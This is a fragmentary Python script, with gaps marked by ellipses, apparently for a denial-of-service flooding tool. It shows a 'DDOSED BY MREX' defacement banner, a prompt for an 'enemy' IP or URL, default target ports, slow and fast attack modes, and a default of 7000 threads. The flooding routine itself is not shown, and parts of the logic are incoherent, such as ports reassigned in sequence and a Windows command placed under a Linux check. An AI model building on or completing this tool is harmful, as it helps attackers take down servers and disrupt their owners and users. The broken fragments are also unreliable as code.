...
ref = [
     '=< DDOSED BY MREX & вадим атака>=',
     '=< пожалуйста, сделайте свой сервер более безопасным >=',
     '=< DDOSED BY MREX & вадим атака >=',
     '=< пожалуйста, сделайте свой сервер более безопасным >=',
     '=< DDOSED BY MREX & вадим атака >=',
     '=< пожалуйста, сделайте свой сервер более безопасным >=',
...
black_lists = ["https://danilosh.xyz"]
...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system("cls & title Vadim Blyat")
    print('''============================< вадим блят >=============================
||                     Creator BorzXy and вадим                      ||
||                          Credit фон das                           ||
||              Это не детская игра, так что не пытайтесь            ||
==============================< Вадим >================================
''')
    try:
...
def start_url():
    ...
    if sys.platform.startswith("linux"):
        ...
        pass
    logo()
    url = input("вражеский IP / URL\nEnter Your Blyat Enemy IP / URL\n> ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
...
def start_port():
    ...
    if port == '':
        if "https" in url:
            ...
            port = int(3306)
            print("Selected Port = 3306")
            port = int(3659)
            print("Selected Port = 3659")
            port = int(2302)
            print("Selected Port = 2302")
            port = int(3389)
...
[*]=================================================[*]
""")
    choice_mode = input("Attack Mode [1-2]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
...
def choice_method_attack():
    ...
    print("1. медленный / Slow")
    print("2. быстрый / Fast")
    method_attack = input("Выбрать / Choose\n> ")
...
def numthreads():
    global threads
    try:
        threads = int(input("Threads [7000]\n>"))
    except ValueError:
        threads = int(7000)
        print ("Избранные темы\nSelected Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('нажмите ввод, чтобы начать\npress enter to start:: ')
    if choice6 == "":
